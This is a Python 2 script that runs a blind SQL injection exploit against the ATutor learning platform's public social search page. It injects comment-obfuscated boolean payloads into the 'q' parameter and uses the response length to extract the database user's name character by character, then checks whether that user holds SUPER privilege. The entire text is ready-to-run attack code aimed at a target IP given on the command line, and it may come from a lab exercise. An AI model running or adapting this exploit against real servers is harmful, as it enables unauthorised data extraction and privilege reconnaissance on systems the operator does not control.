import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None

def extractor_loop(injection, ip):
    result = ""
    for i in range(1, 20):
        injection_string = injection % i
#        print injection_string
        extracted_char = searchFriends_sqli(ip, injection_string)
        if(extracted_char):
            result += chr(extracted_char)
        else:
            break
    return result


def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.1.100'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print "(+) Retrieving current user...."
    user = extractor_loop("test'/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]/**/or/**/1='", ip)
    if len(user)>0:
        print "(+) User: %s" % user

    print "(+) Retrieving user SUPER privileges...."
    mysql_user = user.split("@")
    mysql_user = "'" + mysql_user[0] + "'@'" + mysql_user[1] + "'"
    priv = extractor_loop('test\'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee="'+mysql_user+'"/**/and/**/privilege_type=\'super\'),%d,1)))=[CHAR]/**/or/**/1=\'', ip)
    if len(user)>0:
        print "(+) Privilege: %s" % priv


if __name__ == "__main__":
    main()
